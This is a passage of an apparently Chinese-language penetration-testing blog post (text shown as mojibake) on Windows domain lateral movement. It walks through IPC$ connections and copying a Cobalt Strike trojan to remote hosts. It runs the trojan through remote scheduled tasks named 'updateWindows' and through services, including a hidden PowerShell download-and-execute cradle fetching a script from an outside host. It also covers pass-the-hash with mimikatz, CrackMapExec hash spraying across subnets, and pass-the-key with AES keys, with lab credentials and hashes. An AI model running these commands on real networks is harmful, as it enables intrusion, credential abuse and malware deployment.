<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ é™¤ ipc è¿æ¥</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ /del</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/Sgg8BQc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å…³é—­å…±äº«</span><br><span class="line"></span><br><span class="line">net share IPC$ /del</span><br><span class="line"></span><br><span class="line">å¼€å¯å…±äº«</span><br><span class="line"></span><br><span class="line">net share IPC$</span><br><span class="line"></span><br><span class="line">è‡ªå®šä¹‰å…±äº«</span><br><span class="line"></span><br><span class="line">net share kzh=C</span><br></pre></td></tr></table></figure>


<blockquote>
<p>[!NOTE] åˆ©ç”¨æ¡ä»¶</p>
<ol>
<li>å¼€å¯äº† 139ã€445 ç«¯å£<ul>
<li>iPC$å¯ä»¥å®ç°è¿œç¨‹ç™»å½•åŠå¯¹é»˜è®¤å…±äº«èµ„æºçš„è®¿é—®ï¼Œ445 ç«¯å£å¯ä»¥å®ç°å¯¹å…±äº«æ–‡ä»¶æ‰“å°æœºçš„è®¿é—®ã€‚å› æ­¤ï¼Œä¸€èˆ¬æ¥è®²éœ€è¦ 445 ç«¯å£çš„æ”¯æŒã€‚</li>
</ul>
</li>
<li>ç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº« <ul>
<li>é»˜è®¤å…±äº«æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜è¿›è¡Œè¿œç¨‹ç®¡ç†è€Œé»˜è®¤å¼€å¯çš„ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„é€»è¾‘ç›˜(c$ã€d$ã€e$ã€admin$)å¯ä»¥å®ç°å¯¹è¿™äº›é»˜è®¤å…±äº«ç›®å½•çš„è®¿é—®(net share)</li>
</ul>
</li>
<li>å¿…é¡»çŸ¥é“å¯¹æ–¹æœºå™¨çš„ç”¨æˆ·åå’Œå¯†ç </li>
</ol>
</blockquote>
<p>ä¸åŒç”¨æˆ· ipc$çš„å‘½ä»¤æƒé™,ipc è¿æ¥å»ºç«‹ä¹‹åå¯ä»¥æ‰§è¡Œå¾ˆå¤šå‘½ä»¤ï¼Œå¦‚ï¼š</p>
<ul>
<li><code>tasklist /S ip</code>  æŸ¥çœ‹è¿›ç¨‹<ul>
<li><img src="https://i.imgur.com/WtqXDYl.png" alt="x|600x250"></li>
</ul>
</li>
<li><code>dir \\ip\c$</code>  åˆ—ç›®å½•<ul>
<li><img src="https://i.imgur.com/iPZ1EbK.png" alt="x|600x250"></li>
</ul>
</li>
<li><code>type \\ip\c$\1.exe</code>  æŸ¥çœ‹æ–‡ä»¶<ul>
<li><img src="https://i.imgur.com/lqcOQaW.png"></li>
</ul>
</li>
<li><code>copy 1.exe \\ip\c$</code>  å¤åˆ¶æ–‡ä»¶<ul>
<li><img src="https://i.imgur.com/P43vKKI.png"></li>
</ul>
</li>
</ul>
<p>æ’é™¤æœ¬æœºçš„å½±å“ï¼Œå¯¹äºä¸åŒç›®æ ‡ç”¨æˆ·å»ºç«‹ ipc è¿æ¥æƒé™æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>åŸŸ</th>
<th>åŸŸç®¡ç†å‘˜</th>
<th>åŸŸå†…ç”¨æˆ·</th>
<th>æœ¬åœ°</th>
<th>æœ¬åœ°ç®¡ç†å‘˜</th>
<th>æœ¬åœ°ç”¨æˆ·</th>
</tr>
</thead>
<tbody><tr>
<td>dirã€type</td>
<td>âˆš</td>
<td>âˆš</td>
<td>Ã—</td>
<td>âˆš</td>
<td>Ã—</td>
<td>Ã—</td>
</tr>
<tr>
<td>copy</td>
<td>âˆš</td>
<td>âˆš</td>
<td>Ã—</td>
<td>âˆš</td>
<td>Ã—</td>
<td>Ã—</td>
</tr>
</tbody></table>
<blockquote>
<p>[!NOTE] ä¸€ç‚¹ä¾‹å¤–<br>åœ¨Windows Server 2003åŠè€ç‰ˆæœ¬çš„Windowsç”µè„‘ä¸­ï¼Œä½¿ç”¨æ™®é€šç®¡ç†å‘˜è¿›è¡ŒIPCè¿æ¥ä¹‹åå³å¯å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œ(å¦‚dir copy type)</p>
</blockquote>
<blockquote>
<p>[!NOTE]</p>
<p>åŸŸæˆå‘˜-&gt;åŸŸç®¡ç†å‘˜ï¼š<br><img src="https://i.imgur.com/r2iH9O2.png"></p>
<p>æœ¬åœ°-&gt;åŸŸç®¡ç†å‘˜<br><img src="https://i.imgur.com/TqAaVQw.png"></p>
<p>æœ¬åœ°-&gt;åŸŸæˆå‘˜<br><img src="https://i.imgur.com/agv2eNC.png"></p>
</blockquote>
<h3 id="ipc-é…åˆè®¡åˆ’ä»»åŠ¡"><a href="#ipc-é…åˆè®¡åˆ’ä»»åŠ¡" class="headerlink" title="ipc$é…åˆè®¡åˆ’ä»»åŠ¡"></a>ipc$é…åˆè®¡åˆ’ä»»åŠ¡</h3><p>å¦‚æœæˆ‘ä»¬èƒ½ä»¥é«˜æƒé™ç”¨æˆ·å’ŒåŸŸå†…å…¶ä»–ä¸»æœºå»ºç«‹ ipc è¿æ¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†æœ¨é©¬ä¸Šä¼ è‡³å…¶ä»–ä¸»æœºä¸­ï¼Œè¿™æ—¶åªè¦æ‰§è¡Œè¿™ä¸ªæœ¨é©¬å³å¯ä½¿å…¶ä»–ä¸»æœºä¸Šçº¿ï¼Œè€Œä½¿ç”¨è®¡åˆ’ä»»åŠ¡ï¼Œå¯ä»¥æ‰§è¡Œç¨‹åºã€‚</p>
<p>åœ¨ Windows XP ä¹‹å‰ä½¿ç”¨ at å‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œä¹‹åä½¿ç”¨ schtasks å‘½ä»¤ã€‚</p>
<p>è®¡åˆ’ä»»åŠ¡æ˜¯å…è®¸è¿œç¨‹åˆ›å»ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ A æœºå™¨å¯ä»¥åœ¨ B æœºå™¨ä¸Šåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œå‰ææ˜¯éœ€è¦è´¦å·å¯†ç ã€‚ä½†æ˜¯ at å‘½ä»¤ä¸éœ€è¦ã€‚</p>
<p>æ³¨æ„ï¼Œ&#x3D;&#x3D;å»ºç«‹ IPC è¿æ¥å’Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡æœ€å¥½ä¸è¦ä½¿ç”¨ CS ä¸Šçš„ systemshellã€‚&#x3D;&#x3D;</p>
<ol>
<li>é¦–å…ˆåˆ›å»º ipc è¿æ¥ï¼Œå¤åˆ¶æœ¨é©¬è‡³ç›®æ ‡ä¸»æœºï¼ˆæ³¨æ„ï¼Œæœ€å¥½ä¸è¦ç”¨ system ç”¨æˆ·ï¼Œå¯èƒ½ä¼šå‡ºé”™ï¼‰<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br><span class="line"></span><br><span class="line">copy artifact2.exe \\192.168.255.10\c$\ls.exe</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>å¼€å¯ipcæœåŠ¡</li>
<li>ä¸Šä¼ csçš„æœ¨é©¬exeç¨‹åºåˆ°ç›®æ ‡ä¸»æœº<br><img src="https://i.imgur.com/G8MAg7N.png"></li>
</ul>
<ol start="2">
<li>åˆ›å»ºè®¡åˆ’ä»»åŠ¡ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru system /F</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>ä¸è¿‡å¹¶ä¸å»ºè®®ä½¿ç”¨systemçš„shellï¼Œæœ€å¥½ä½¿ç”¨ administrator æƒé™ï¼Œä¸ç„¶ä¸å¥½ç»§ç»­ä½¿ç”¨ ipc æ¨ªå‘ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru administrator /F</span><br></pre></td></tr></table></figure></li>
<li>ä½¿ç”¨administratoræƒé™åˆ›å»ºè®¡åˆ’ä»»åŠ¡</li>
<li>è®¡åˆ’ä»»åŠ¡åä¸ºupdateWindows</li>
<li>å¯åŠ¨é¢‘ç‡è®¾ç½®ä¸ºonstartï¼Œå³å¼€æœºè‡ªå¯åŠ¨<br><img src="https://i.imgur.com/jSsAnzD.png"></li>
</ul>
<ol start="3">
<li><p>è¿è¡Œè®¡åˆ’ä»»åŠ¡ä¸Šçº¿ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.255.10 /u administrator /p Win.2024 /i /tn updateWindows</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ii27JG8.png"><br>å¾ˆå¿«cså°±å›æ˜¾ä¸Šçº¿äº†<br><img src="https://i.imgur.com/zh6Qw9P.png"></p>
</li>
<li><p>åˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ProY53j.png"></p>
</li>
</ol>
<h3 id="ipc-é…åˆæœåŠ¡"><a href="#ipc-é…åˆæœåŠ¡" class="headerlink" title="ipc$é…åˆæœåŠ¡"></a>ipc$é…åˆæœåŠ¡</h3><p>å»ºç«‹ ipc è¿æ¥ä¹‹åï¼Œè¿˜å¯ä»¥ç›´æ¥è¿œç¨‹åˆ›å»ºæœåŠ¡ä¸Šçº¿æœ¨é©¬ã€‚åˆ›å»ºæœåŠ¡ test å¹¶ä¸”æŒ‡å®šæ‰§è¡Œè·¯å¾„ æ³¨æ„<code>=</code>å³è¾¹éœ€è¦æœ‰ä¸€ä¸ªç©ºæ ¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 create test binpath= &quot;cmd.exe /c c:C:\Users\Administrator\Desktop\artifact2.exe&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wYhe535.png"></p>
<ul>
<li>ä½¿ç”¨scè¿œç¨‹åˆ›å»ºåä¸ºtestçš„æœåŠ¡</li>
<li>å¯åŠ¨æ—¶å°†è°ƒç”¨ <code>cmd.exe /c C:\Users\Administrator\Desktop\artifact2.exe</code> æ¥æ‰§è¡Œæ¡Œé¢ä¸Šçš„æ–‡ä»¶</li>
</ul>
<p>powershell ä¸Šçº¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\dc.kea.com create test1 binpath= &quot;cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadsrting(&#x27;http://192.168.31.212/1.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>å¼€å¯æœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 start test</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/cVffkuw.png" alt="x|950x150"></p>
<ul>
<li>ä¼¼ä¹æŠ¥é”™ï¼Ÿä½†æœåŠ¡æˆåŠŸä¸Šçº¿äº†<br><img src="https://i.imgur.com/aOjJgmH.png" alt="x|950x400"></li>
</ul>
<p>åˆ é™¤æœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.197.30 delete test</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/YlQjErK.png"></p>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>PTH æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ˜¯ä¸€ç§åœ¨å†…ç½‘æ¸—é€ä¸­å¸¸è§çš„æ”»å‡»æ‰‹æ®µã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªå¸¦é”çš„ç®±å­ï¼Œè¿™ä¸ªç®±å­ç”¨ä¸€æŠŠé’¥åŒ™æ¥æ‰“å¼€ã€‚ä½†æ˜¯ï¼Œä½ å¹¶æ²¡æœ‰è¿™æŠŠé’¥åŒ™ï¼Œè€Œæ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªè¿™æŠŠé’¥åŒ™çš„â€œæŒ‡çº¹â€ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªé’¥åŒ™çš„æŸç§ç‹¬ç‰¹ç‰¹å¾çš„æ•°å­—åŒ–è¡¨ç¤ºï¼Œä½†ä¸æ˜¯é’¥åŒ™æœ¬èº«ï¼‰ã€‚è™½ç„¶ä½ æ²¡æœ‰é’¥åŒ™ï¼Œä½†åªè¦ä½ æ‰¾åˆ°äº†ä¸€ä¸ªèƒ½è¯†åˆ«è¿™ä¸ªâ€œæŒ‡çº¹â€çš„é”ï¼ˆæˆ–è€…æ˜¯ä¸€ä¸ªèƒ½è¢«è¿™ä¸ªâ€œæŒ‡çº¹â€æ¬ºéª—çš„ç³»ç»Ÿï¼‰ï¼Œä½ å°±èƒ½æ‰“å¼€è¿™ä¸ªç®±å­ã€‚</p>
<p>åœ¨ PTH æ”»å‡»ä¸­ï¼Œè¿™ä¸ªâ€œç®±å­â€å°±æ˜¯å—ä¿æŠ¤çš„è®¡ç®—æœºç³»ç»Ÿæˆ–èµ„æºï¼Œâ€œé’¥åŒ™â€å°±æ˜¯ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œè€Œâ€œæŒ‡çº¹â€å°±æ˜¯å¯†ç çš„å“ˆå¸Œå€¼ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼ˆæ¯”å¦‚å…¬å¸æˆ–ç»„ç»‡å†…éƒ¨çš„ç½‘ç»œç¯å¢ƒï¼‰ï¼Œ&#x3D;&#x3D;ç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶é€šå¸¸ä½¿ç”¨åŸŸè´¦å·ï¼Œè€Œä¸”å¾ˆå¤šè®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç &#x3D;&#x3D;ã€‚å¦‚æœæ”»å‡»è€…è·å–åˆ°äº†è¿™ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦å·çš„å“ˆå¸Œå€¼ï¼Œä»–å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå“ˆå¸Œå€¼æ¥ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–è®¡ç®—æœºï¼Œå°±åƒä»–è‡ªå·±æ˜¯é‚£ä¸ªç®¡ç†å‘˜ä¸€æ ·ã€‚</p>
<p>PTH æ”»å‡»å‰æï¼š<br>â€¢ ç›®æ ‡æœºå™¨å¼€æ”¾ 445 ç«¯å£ã€‚<br>â€¢ å…·å¤‡ç®¡ç†å‘˜çš„ NTLM å“ˆå¸Œå€¼ï¼Œå¹¶ä¸”ç›®æ ‡ä½¿ç”¨äº†åŒæ ·çš„è´¦å·å¯†ç ã€‚</p>
<h3 id="ä¸åŒç”¨æˆ·æƒé™åŒºåˆ«"><a href="#ä¸åŒç”¨æˆ·æƒé™åŒºåˆ«" class="headerlink" title="ä¸åŒç”¨æˆ·æƒé™åŒºåˆ«"></a>ä¸åŒç”¨æˆ·æƒé™åŒºåˆ«</h3><p>ä»¥ä¸‹å‡è®¨è®ºé»˜è®¤æƒ…å†µã€‚</p>
<ul>
<li>æœ¬åœ°ç”¨æˆ·:è€Œ Windows2003ã€Windows XPã€Windows visaa å¯ä»¥ä½¿ç”¨æ™®é€šç®¡ç†å‘˜ç”¨æˆ·è¿›è¡ŒPTH æ”»å‡»ã€‚Windows2003 ä¹‹åçš„æœºå™¨ï¼Œåªèƒ½ä½¿ç”¨ administrator ç”¨æˆ·è¿›è¡Œ PTH æ”»å‡»ã€‚</li>
<li>åŸŸç”¨æˆ·:å¯¹äºåŸŸæœ€é«˜ç®¡ç†å‘˜ administratorã€Domain Admins ç»„ä¸­çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œéƒ½å¯ä»¥è¿›è¡Œ PTH æ”»å‡»ã€‚ä½†æ˜¯åŸŸå†…æ™®é€šç”¨æˆ·ä¸å¯ä»¥ã€‚</li>
</ul>
<h3 id="Hash-ç¢°æ’æŸ¥è¯¢å¯ç”¨-PTH"><a href="#Hash-ç¢°æ’æŸ¥è¯¢å¯ç”¨-PTH" class="headerlink" title="Hash ç¢°æ’æŸ¥è¯¢å¯ç”¨ PTH"></a>Hash ç¢°æ’æŸ¥è¯¢å¯ç”¨ PTH</h3><p>PTH ä¼ é€’é™¤äº†æƒé™è¦æ±‚ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦å‰æå°±æ˜¯åŒæ–¹çš„ç”¨æˆ·åå¯†ç ä¸€è‡´ï¼Œé‚£</p>
<p>å¦‚ä½•å¾—çŸ¥æ‹¥æœ‰ç›¸åŒè´¦å·å¯†ç çš„æœºå™¨ï¼Œå…¶å®ä¸ç”¨çŸ¥é“ï¼Œå…¨éƒ¨è·‘ä¸€éå°±è¡Œäº†ã€‚</p>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>å‘½ä»¤å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨åŸŸæˆå‘˜æœº192.168.255.10è¿æ¥åˆ°åŸŸæ§192.168.255.4</p>
<p>è·å–åˆ°ç›®æ ‡æœºå™¨çš„hash<br><img src="https://i.imgur.com/rDJoOt6.png" alt="700"></p>
<ul>
<li>hash:8f43b30edfe321e2fb2d2c227ef35993</li>
</ul>
<p>åˆ°åŸŸæ§æœºæ‰§è¡Œmimikatzå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user Administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/peoiNeH.png"></p>
<p>ä¹‹åä¼šå¼¹å‡ºä¸€ä¸ª shellï¼Œè¯¥ shell å·²ç»å’Œç›®æ ‡ä¸»æœºå·²ç»å»ºç«‹äº†è®¤è¯ï¼Œ&#x3D;&#x3D;è¯¥è®¤è¯é€šè¿‡ä¹‹åå¯ä»¥è¿œç¨‹åˆ›å»ºã€æ‰§è¡Œè®¡åˆ’ä»»åŠ¡å’ŒæœåŠ¡&#x3D;&#x3D;ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸Šçº¿ã€‚image-20241108145245337<br><img src="https://i.imgur.com/BJS0Huk.png"></p>
<p>å¦‚ä¸‹æ‰€ç¤ºï¼ˆè¿œç¨‹åˆ›å»ºæœåŠ¡ä¹Ÿå¯ä»¥ï¼‰:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy beacon_x64.exe \\192.168.197.40\c$\b.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.197.40 /tn test /tr c:\b.exe /Ru administrator /sc onstart /F</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.197.40 /tn test /i</span><br></pre></td></tr></table></figure>

<h4 id="CS-PTH-ä¸Šçº¿"><a href="#CS-PTH-ä¸Šçº¿" class="headerlink" title="CS PTH ä¸Šçº¿"></a>CS PTH ä¸Šçº¿</h4><p>é€šè¿‡å­¦ä¹ æˆ‘ä»¬çŸ¥é“äº† PTH,æœ¬è´¨æ˜¯ä¸Šè®¤è¯ï¼Œä¹‹å‰å­¦ä¹ è¿‡çš„ IPC$è¿æ¥æ˜¯é€šè¿‡è´¦å·å¯†ç è¿›è¡Œè®¤è¯çš„ã€‚</p>
<p>PTH æ˜¯é€šè¿‡è´¦å·å’Œ hash å€¼è¿›è¡Œè®¤è¯çš„ï¼Œä½†æ˜¯å…‰è®¤è¯è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œè®¤è¯é€šè¿‡ä¹‹åè¿˜éœ€è¦é…åˆä¸Šä¼ ï¼Œè®¡åˆ’ä»»åŠ¡ï¼ŒæœåŠ¡ç­‰å…¶ä»–çš„æ“ä½œè¿›è¡Œä¸Šçº¿ï¼ŒCS æ”¯æŒ jump å‘½ä»¤ï¼Œé…åˆ psexec ä¸€é”®ä¸Šçº¿ã€‚</p>
<p><img src="https://i.imgur.com/hynbYKc.png"></p>
<p><img src="https://i.imgur.com/KDXQ6IY.png" alt="600"></p>
<ul>
<li>å‰ä¸‰é¡¹æ˜¯é€‰å®šæœ¬åœ°æŠ“å–åˆ°çš„å‡­è¯ï¼Œé€‰æ‹©è¦ä¸Šçº¿çš„ç›®æ ‡ç”¨æˆ·å‡­è¯,domiané¡¹è¿™é‡Œæ³¨æ„è¿˜æ˜¯å¡«å†™ç›®æ ‡ipåœ°å€å¥½äº›</li>
<li>ç¬¬å››é¡¹é€‰æ‹©ä½¿ç”¨çš„ç›‘å¬å™¨</li>
<li>ç¬¬äº”é¡¹é€‰æ‹©é€šè¿‡å“ªä¸ªæœºå™¨&#x2F;ç”¨æˆ·è¿›è¡Œä¼ é€’</li>
<li>è¿™é‡Œæ˜¯ä½¿ç”¨192.168.255.4æ¨ªå‘ç§»åŠ¨åˆ°192.168.255.10ä¸Šçº¿</li>
</ul>
<p>æ‰€æ‰§è¡Œçš„æ“ä½œ<br><img src="https://i.imgur.com/GSsXqbW.png" alt="800"><br><img src="https://i.imgur.com/x3wNcTf.png" alt="800"></p>
<p>æˆåŠŸä¸Šçº¿<br><img src="https://i.imgur.com/kRxn3tc.png"></p>
<h4 id="CractMapExecæ‰¹é‡-pth"><a href="#CractMapExecæ‰¹é‡-pth" class="headerlink" title="CractMapExecæ‰¹é‡ pth"></a>CractMapExecæ‰¹é‡ pth</h4><p>è¿™é‡Œéœ€è¦ä½¿ç”¨ LM:NTLM</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackMapexec.exe 192.168.197.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:35a2fedaa43b5f18e4ed98f3cf70c092</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé€‰ç”¨192.168.255.10çš„LM:NTLM<br><img src="https://i.imgur.com/DF1HGcu.png"></p>
<ul>
<li>è·å¾—hashï¼šaad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/7IHwreX.png" alt="1200"><br>è¿™å·¥å…·è‡ªå·±çš„ç¯å¢ƒåªæµ‹è¯• æ™®é€šç”¨æˆ·ï¼Œä¸å»æµ‹æœ¬åœ°çš„ administratorï¼Œæ•…è€Œå…¨éƒ¨å¤±è´¥ã€‚</p>
<p>è§£å†³æ–¹å¼ã€‚</p>
<ul>
<li>æŒ‡å®š-d å‚æ•°æ—¶ï¼Œå¦‚æœåŸŸåä¸å­˜åœ¨é‚£ä¹ˆå°±ä¼šæµ‹è¯•æœ¬åœ°ç”¨æˆ·ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993 -d local</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/AsePSeD.png" alt="1200"></li>
</ul>
<p>åç»­ä½¿ç”¨192.168.255.4ä¸­ç”¨æˆ·çš„hash<br><img src="https://i.imgur.com/5ZFg60n.png" alt="1200"></p>
<ul>
<li>è·å¾—hashï¼šaad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/pqFpKy4.png" alt="1200"></p>
<h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>PTK(Pass The key)),ä¸­æ–‡å«ç§˜é’¥ä¼ é€’æ”»å‡»ï¼ŒPTH ä¼ é€’ä¸­ï¼Œä½¿ç”¨çš„æ˜¯ NTLM-HASH å€¼è¿›è¡Œè®¤è¯ï¼ŒPTK ä½¿ç”¨ AES256 æˆ–è€… AES128 çš„æ–¹å¼è¿›è¡Œä¼ é€’ï¼ŒPTK æ”»å‡»åªèƒ½ç”¨äºkerberos è®¤è¯ä¸­ï¼ŒNTLM è®¤è¯ä¸­ä¸å­˜åœ¨è¿™ä¸€æ”»å‡»æ‰‹æ³•ã€‚</p>
<p>åœ¨ kerberos è®¤è¯ä¸­ï¼Œå…¶ä¸­ AS-REQ æ•°æ®åŒ…ä¸­çš„ PA-DATA- pc-ENC-TIMESTAMP ä¸­çš„æ•°æ®æ˜¯è¿›è¡ŒåŠ å¯†çš„ï¼ŒåŠ å¯†çš„æ–¹å¼ç”± etype å†³å®šï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ç”¨æˆ· HASH åŠ å¯†æˆ–è€… AES key åŠ å¯†ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿ PTH å’Œ PTK æ”»å‡»ã€‚</p>
<p>AES KEY åˆåˆ†ä¸º 256 ä½å’Œ 128 ä½ã€‚AES-KEY åªåœ¨ kerberos è®¤è¯ä¸­ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬åŸŸç”¨æˆ·æ‰ä¼šæœ‰è¯¥å€¼ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ <code>mimikatz â€œprivilege::debugâ€ â€œsekurlsa::ekeysâ€</code> è¯»å– AES keyã€‚</p>
<p>å¦‚æœåœ¨åŸŸå†…æœºå™¨ä¸­ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œå¯èƒ½ä¼šæŠ“åˆ°æœºå™¨ç”¨æˆ·çš„ AES Keyã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶<br>1ã€å¿…é¡»æ˜¯åŸŸç¯å¢ƒï¼Œä½¿ç”¨åŸŸè´¦å·æ‰èƒ½è¿›è¡Œ PTK æ”»å‡»ã€‚<br>2ã€kerberos æ”¯æŒ AES è®¤è¯ã€‚</p>
<p>ä½¿ç”¨ impacket-psexec å®Œæˆ PTK æ”»å‡»:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…¨åŸŸå/ç”¨æˆ·å@åŸŸååœ°å€ -aeskey xxx</span><br><span class="line"></span><br><span class="line">gouzi.com/dadmin@dc.gouzi.com -aesKey 8cac5b0cf475d11099d7d9f787f02fac304227bc3b0ae6dab20a318317bfc065</span><br></pre></td></tr></table></figure>
<p>246951e5d9a1233b12117c071830d76d2ae8b6e5b509a3b848e21838cc85100c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/Adminitrator.kea.com -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure>

